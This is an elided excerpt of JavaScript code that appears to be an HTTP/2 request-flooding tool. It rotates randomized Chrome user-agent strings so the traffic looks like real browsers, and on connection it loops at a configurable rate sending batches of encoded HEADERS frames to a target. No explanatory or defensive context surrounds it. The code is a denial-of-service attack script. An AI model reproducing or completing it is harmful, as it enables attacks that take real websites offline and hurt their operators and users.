...
const browserVersion = getRandomInt(116, 124);
const headerBuilder = {
    userAgent: [
        ...
        `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`,
        `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`,
        `Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36`,
        `Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari/537.36 Edge/12.0`,
        `Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${browserVersion}.0.0.0 Safari`,
  ],
...
if (args.protocol === "http2") {
    ...
    client.on("connect", async () => {
        const intervalId = setInterval(async () => {
            ...
            const streamId = 1; // Assuming you manage stream IDs appropriately
            const requests = [];
            for (let i = 0; i < args.Rate; i++) {
                ...
                requests.push({ promise: requestPromise, frame: encodeFrame(streamId, 1, packed, 0x25) });
            }

            await Promise.all(requests.map(({ promise, frame }) => {
                return promise.then(() => frame);
            }));
